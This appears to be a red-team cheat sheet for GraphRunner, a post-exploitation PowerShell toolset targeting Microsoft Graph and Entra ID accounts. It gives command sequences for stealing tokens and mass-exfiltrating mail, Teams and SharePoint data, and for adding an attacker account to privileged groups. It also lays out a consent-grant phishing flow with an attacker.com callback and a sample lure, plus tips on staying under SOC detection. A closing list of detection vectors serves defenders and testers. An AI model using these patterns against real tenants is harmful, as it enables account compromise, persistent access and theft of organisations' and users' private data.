GraphRunner

GraphRunner

GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API

What it is

GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API. It provides various tools for performing reconnaissance, persistence, and pillaging of data from a Microsoft Entra ID (Azure AD) account.

It consists of three separate parts:

  • A PowerShell script where the majority of modules are located
  • An HTML GUI that can use an access token to navigate and pillage a user's account
  • A simple PHP redirector for harvesting authentication codes during an OAuth flow

Main Features

  • Search and export email
  • Search and export SharePoint and OneDrive files accessible to a user
  • Search all Teams chats and channels visible to the user and export full conversations
  • Deploy malicious apps
  • Discover misconfigured mailboxes that are exposed
  • Clone security groups to carry out watering hole attacks
  • Find groups that can be modified directly by your user or where membership rules can be abused to gain access
  • Search all user attributes for specific terms
  • use a GUI built on the Graph API to pillage a user's account
  • Dump conditional access policies
  • Dump app registrations and external apps including consent and scope to identify potentially malicious apps
  • Tools to complete OAuth flow during consent grant attacks
  • GraphRunner doesn't rely on any third-party libraries or modules
  • Works with Windows and Linux
  • Continuously refresh your token package

Usage

As GraphRunner is a post-exploitation tool most of the modules rely on having authenticated access tokens. To assist with this there are multiple modules for obtaining and working with both user and application (service principal) tokens.

A good starting place is to import the PowerShell script and run the Get-GraphTokens module.

Import-Module .\GraphRunner.ps1
Get-GraphTokens

Next, check out the wiki for the full user guide and information about individual modules.

Attack Patterns

Pattern: Token Theft → Full Exfiltration

# 1. Obtain tokens
Get-GraphTokens

# 2. Search for sensitive data
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password,credentials,secret"
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "confidential,password"
Invoke-SearchTeams -Tokens $tokens -SearchTerm "api key,token"

# 3. Dump everything
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $tokens.access_token -mailFolder all -OutputFile emails.txt
Invoke-DumpTeams -Tokens $tokens -OutputFile teams.txt

# 4. Download sensitive files
# Parse search results and download files

Pattern: Reconnaissance → Privilege Escalation

# 1. Get tokens
Get-GraphTokens

# 2. Enumerate environment
Invoke-GetUsers -Tokens $tokens
Invoke-GetGroups -Tokens $tokens
Invoke-DumpConditionalAccessPolicies -Tokens $tokens

# 3. Find modifiable groups
Invoke-FindModifiableGroups -Tokens $tokens

# 4. Add yourself to privileged group
Invoke-AddGroupMember -Tokens $tokens -GroupID "privileged-group-id" -UserID "attacker@company.com"

# 5. Refresh tokens to get new permissions
Invoke-RefreshGraphTokens -Tokens $tokens

Pattern: Consent Grant → Persistent Access

# 1. Register malicious app (via Azure Portal)
# Set permissions: Mail.Read, Files.Read.All, Chat.Read

# 2. Generate consent URL
$url = Invoke-GenerateConsentURL -ClientID "malicious-app-id" -RedirectURI "https://attacker.com/callback"

# 3. Phish user with consent link
# "Please authorize this security scan tool..."

# 4. Capture auth code with PHP redirector

# 5. Exchange for tokens
Invoke-ExchangeOAuthCode -Code $code -ClientID "app-id" -ClientSecret "secret"

# 6. Access persists even if user password changes
# Tokens can be refreshed for months/years

Pattern: GUI-Based Pillaging

# 1. Obtain tokens
Get-GraphTokens

# 2. Launch GUI
Invoke-GraphRunner -Tokens $tokens

# 3. Use web interface to:
# - Browse and download emails
# - Search SharePoint for sensitive files
# - Export Teams conversations
# - Navigate OneDrive
# - All point-and-click, no commands needed

Pro Tips

💡 Token Refresh: GraphRunner auto-refreshes tokens to keep sessions alive 💡 No Dependencies: Doesn't require external modules - just PowerShell 💡 Cross-Platform: Works on Windows and Linux with PowerShell Core 💡 GUI Advantage: HTML GUI easier for non-technical operators 💡 Search Smart: Use targeted search terms (password, secret, confidential, api key) 💡 Teams Gold: Teams often contains credentials shared in conversations 💡 SharePoint Treasure: SharePoint commonly has config files with secrets 💡 App Permissions: Malicious apps can access data without user interaction 💡 Dynamic Groups: Look for dynamic group rules that can be abused 💡 CA Policies: Dump CA policies to find security gaps 💡 Watering Hole: Clone groups for targeted phishing campaigns

OPSEC Considerations

⚠️ High Risk:

  • Deploying malicious applications (logged, may alert SOC)
  • Sending emails from compromised accounts
  • Modifying group memberships
  • Bulk data exfiltration

⚠️ Medium Risk:

  • Extensive searches (many Graph API calls)
  • Downloading large numbers of files
  • Accessing resources outside normal user behavior

✅ Lower Risk:

  • Basic enumeration (matches normal user activity)
  • Targeted searches (small number of queries)
  • Using GUI (looks like normal Graph API usage)
  • Token refresh (normal OAuth behavior)

Detection Vectors:

  • Azure AD audit logs
  • Graph API usage logs
  • Unusual application consent events
  • New application registrations
  • Group membership changes
  • Mass data access patterns
  • Downloads from unusual locations
  • OAuth token grants

User.Read.All - Read all users
Group.Read.All - Read all groups
Directory.Read.All - Read directory data
